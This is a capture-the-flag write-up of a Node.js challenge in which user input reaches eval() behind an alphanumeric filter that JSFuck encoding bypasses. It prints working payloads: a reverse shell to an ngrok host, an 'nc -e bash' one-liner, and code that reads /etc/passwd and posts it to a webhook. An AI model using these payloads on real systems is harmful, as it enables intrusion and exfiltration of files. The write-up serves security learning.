## Migraine

<br>

![image](https://user-images.githubusercontent.com/64314534/235347349-229b36ce-894c-469e-8205-9e57bc3dda5a.png)

<br>
  
Another code review web challenge (Node js)


## Let's Start by analyzing the code :

There are many files but we will only review `app.js` file :


<br>

![image](https://user-images.githubusercontent.com/64314534/235347578-55e934d8-5c26-49c8-905a-6e8d6c40bad3.png)

<br>

The `app.js` file had this content : 

<br>

![image](https://user-images.githubusercontent.com/64314534/235361632-2f328a01-0f68-4c85-a72d-8245157c749d.png)

<br>

## Code Analysis

<br>

The Get of '/' route will just view the index.html file 

<br>
But the POST of '/' route will do the following:

- Take the value of `src` HTTP parameter from the user and store it in `src` variable 
- Check if the value of the src is matching this Regex : `/[A-Za-z0-9]/` that means matching any alphanumberic character and if it matches the server will send `Bad character detected.` as a response.
- If not matched the server will pass `src` value into eval function //very interesting part
- If there is an error while evaling the value of `src` the server will respond by 'Error on eval.' and if not it will send 'Success!'


<br>

## How we can exploit this code ??

<br>

Since we can pass an input for eval() function, so we can run our code on the server.
<br>
But the problem here is the regex filter, how we can write our code without any alpha chars or numbers ??
<br>
Basiclly we can use `js fuck` to write our js code within these chars only : `'[',']','+'`
<br>
i tried to get reverse shell and rce with these payloads :
```node
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(14097, "6.tcp.eu.ngrok.io", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

```
<br>

```node
require('child_process').exec('nc -e bash 6.tcp.eu.ngrok.io 14097')


```

<br>

but they didn't work so, i opened the docker image that they provided and i noticed that the server didn't had nc or even curl/wget binaries :) so, i decided to open the flag file and send it's content to my web-hook with this payload:
```node
require('http').request({hostname:'web_hook_url',path:'/upload',port:80,method:'POST',headers:{'Content-Type':'text/plain','Content-Length':require('fs').statSync('/etc/passwd').size}},(r)=>r.on('data',(d)=>process.stdout.write(d))).on('error',(e)=>console.error(e)).end(require('fs').readFileSync('/etc/passwd','utf8'));
```
and i use this website http://www.jsfuck.com/  to make it in js fuck : D

and i could get the flag :

<br>
 
![image](https://user-images.githubusercontent.com/64314534/235363159-f9b0ce6a-22b0-4fcb-9f8c-c791d53377b0.png)


<br>
 
